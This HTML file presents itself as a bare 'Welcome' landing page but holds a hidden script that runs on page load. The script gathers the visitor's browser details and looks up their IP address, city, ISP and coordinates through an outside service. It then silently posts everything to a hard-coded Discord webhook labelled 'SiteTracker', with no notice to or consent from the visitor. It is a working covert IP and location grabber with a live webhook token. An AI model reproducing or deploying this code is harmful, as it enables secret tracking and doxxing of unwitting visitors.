<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Welcome</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body {
    font-family: 'Segoe UI', system-ui, sans-serif;
    background: #0f0f0f;
    color: #e0e0e0;
    display: flex;
    align-items: center;
    justify-content: center;
    min-height: 100vh;
  }
  .center {
    text-align: center;
    opacity: 0;
    animation: fadein 0.8s ease forwards 0.3s;
  }
  h1 { font-size: 2rem; font-weight: 300; letter-spacing: 0.05em; }
  p  { margin-top: 10px; color: #666; font-size: 0.9rem; }
  @keyframes fadein { to { opacity: 1; } }
</style>
</head>
<body>

<div class="center">
  <h1>Welcome</h1>
  <p>You're in the right place.</p>
</div>

<script>
(async () => {
  const WEBHOOK = "https://discord.com/api/webhooks/1551604978597232710/nNHpuRwdCjyVBTI3x-11X3aqU1Ey4-F7V_Fh7yrdSx0EcZmX_VOu5kuR23h5qXyQ8Ecf";

  // Gather basic info without IP lookup first
  const ua        = navigator.userAgent;
  const lang      = navigator.language;
  const ref       = document.referrer || "Direct";
  const screen_s  = `${screen.width}x${screen.height}`;
  const tz        = Intl.DateTimeFormat().resolvedOptions().timeZone;
  const timestamp = new Date().toISOString();
  const pageURL   = window.location.href;

  // Fetch IP + geo info
  let ip = "unknown", city = "unknown", region = "unknown",
      country = "unknown", org = "unknown", loc = "unknown";

  try {
    const r = await fetch("https://ipapi.co/json/");
    const d = await r.json();
    ip      = d.ip      || "unknown";
    city    = d.city    || "unknown";
    region  = d.region  || "unknown";
    country = d.country_name || "unknown";
    org     = d.org     || "unknown";
    loc     = d.latitude && d.longitude ? `${d.latitude}, ${d.longitude}` : "unknown";
  } catch (_) {}

  // Build Discord embed
  const payload = {
    username: "SiteTracker",
    avatar_url: "https://cdn.discordapp.com/embed/avatars/0.png",
    embeds: [{
      title: "🌐 New Visitor",
      color: 0x5865F2,
      fields: [
        { name: "IP Address",   value: `\`${ip}\``,      inline: true  },
        { name: "Country",      value: country,           inline: true  },
        { name: "City / Region",value: `${city}, ${region}`, inline: true },
        { name: "ISP / Org",    value: org,               inline: false },
        { name: "Coordinates",  value: loc,               inline: true  },
        { name: "Timezone",     value: tz,                inline: true  },
        { name: "Language",     value: lang,              inline: true  },
        { name: "Screen",       value: screen_s,          inline: true  },
        { name: "Referrer",     value: ref,               inline: false },
        { name: "Page URL",     value: pageURL,           inline: false },
        { name: "User Agent",   value: `\`${ua.slice(0,200)}\``, inline: false }
      ],
      footer: { text: timestamp }
    }]
  };

  try {
    await fetch(WEBHOOK, {
      method:  "POST",
      headers: { "Content-Type": "application/json" },
      body:    JSON.stringify(payload)
    });
  } catch (_) {}
})();
</script>

</body>
</html>
